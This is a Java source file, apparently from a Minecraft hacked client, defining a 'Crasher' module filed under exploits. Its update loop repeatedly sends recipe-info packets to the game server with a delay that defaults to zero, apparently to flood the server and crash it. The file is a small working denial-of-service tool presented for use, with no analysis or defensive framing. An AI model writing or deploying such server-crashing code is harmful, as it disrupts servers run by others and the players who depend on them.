package dev.zihasz.zware.features.module.exploit;

import dev.zihasz.zware.features.module.Category;
import dev.zihasz.zware.features.module.Module;
import dev.zihasz.zware.features.setting.Setting;
import dev.zihasz.zware.utils.misc.Timer;
import net.minecraft.network.play.client.CPacketRecipeInfo;

public class Crasher extends Module {

	public Crasher() {
		super("Crasher", "Crasher", Category.EXPLOITS);
	}

	private final Setting<Long> delay = new Setting<>("Delay", "Delay", 0L, 0L, 1000L);
	private final Timer timer = new Timer();

	@Override
	public void onUpdate() {
		if (timer.passedMS(delay.getValue())) {
			mc.player.connection.sendPacket(new CPacketRecipeInfo(true, mc.player.ticksExisted % 2 == 0));
			timer.reset();
		}
	}
}
